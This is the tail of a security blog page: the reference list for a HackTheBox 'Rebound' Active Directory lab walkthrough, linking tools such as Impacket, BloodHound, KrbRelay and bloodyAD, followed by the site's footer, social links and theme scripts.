<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDI0LzAzLzMwL2h0Yi1yZWJvdW5kLmh0bWw=">0xdf’s blog rebound walkthrough<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==">Impacket<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VtcGVyaXMuY29tL2Jsb2cvbmV3LWF0dGFjay1wYXRocy1hcy1yZXF1ZXN0ZWQtc3RzLw==">New Attack Paths? AS Requested Service Tickets<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC9wdWxsLzE0MTM=">Support for Kerberoasting without pre-authentication and ST request through AS-REQ #1413<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RoZVBvcmdzL2ltcGFja2V0">impacket github分支<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0Jsb29kSG91bmQucHk=">bloodhound.py<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9hY2FkZW15LmhhY2t0aGVib3guY29tL2NvdXJzZS9wcmV2aWV3L2FjdGl2ZS1kaXJlY3RvcnktYmxvb2Rob3VuZA==">Active Directory Bloodhound<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0LmJsb29kaG91bmRlbnRlcnByaXNlLmlvL2hjL2VuLXVzL2FydGljbGVzLzE3MzEyMzQ3MzE4MDQzLUdlbmVyaWNBbGw=">Descendant Object Takeover (DOT)<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuaXFmYWtocnVsL3Bvd2Vydmlldy5weQ==">powerview.py<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3NoYWRvdy1jcmVkZW50aWFscy1hYnVzaW5nLWtleS10cnVzdC1hY2NvdW50LW1hcHBpbmctZm9yLXRha2VvdmVyLThlZTFhNTM1NjZhYg==">ShadowCredentials<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvS3JiUmVsYXk=">KrbRelay<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW9Db2NvL1J1bmFzQ3M=">RunasCs<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NyYXZhdGVSb3VnZS9ibG9vZHlBRA==">bloodyAD<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlaGFja2VyLnJlY2lwZXMvYS1kL21vdmVtZW50L2tlcmJlcm9zI3NlcnZpY2UtZm9yLXVzZXItZXh0ZW5zaW9ucw==">Service-for-User (S4U)<i class="fa fa-external-link-alt"></i></span></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="253 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>253
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2024/04/01/rebound/" title="HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self &amp; S4U2Proxy]">https://fdlucifer.github.io/2024/04/01/rebound/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/03/17/htb-manager/" rel="prev" title="HackTheBox Manager [RID cycling + MSSQL xp_dirtree + ESC7 exploitation]">
                  <i class="fa fa-chevron-left"></i> HackTheBox Manager [RID cycling + MSSQL xp_dirtree + ESC7 exploitation]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/04/22/grafana-sql-injection/" rel="next" title="Grafana backend sql injection affected all version">
                  Grafana backend sql injection affected all version <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">253</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">676k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">40:58</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
